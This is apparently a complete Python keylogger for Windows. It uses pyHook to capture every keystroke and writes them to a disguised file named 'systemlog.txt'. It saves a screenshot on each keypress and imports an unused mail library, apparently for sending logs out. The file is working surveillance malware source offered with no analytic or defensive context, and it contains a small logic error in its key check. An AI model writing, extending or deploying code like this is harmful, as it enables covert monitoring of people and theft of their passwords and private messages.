import pyHook,sys,pythoncom,win32console
import smtplib
import logging
import os
import autopy
i = 0
def screenshot(i):
	s = "name"+str(i)+".png";
	bitmap = autopy.bitmap.capture_screen()
	bitmap.save('B:\\works\{}'.format(s))
def OnKeyboardEvent(event):
	global i
	i += 1
	if event.Ascii == 0:
		sys.exit(0)
	screenshot(i)
	if event.Ascii !=0 or 8:		
		file_log = 'B:\\systemlog.txt' 
		if os.path.isfile(file_log) != True:
			f = open(file_log,'w')
			f.write(chr(event.Ascii))
			f.close()
		else:
			f = open(file_log,'r')
			save = f.read()
			f.close()
			k=chr(event.Ascii)
			if event.Ascii==13:
				k='\n'    
			if event.Ascii==32:
				k='  '
			save += k
			f = open(file_log,'w')
			f.write(save)
			f.close()
	return True
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()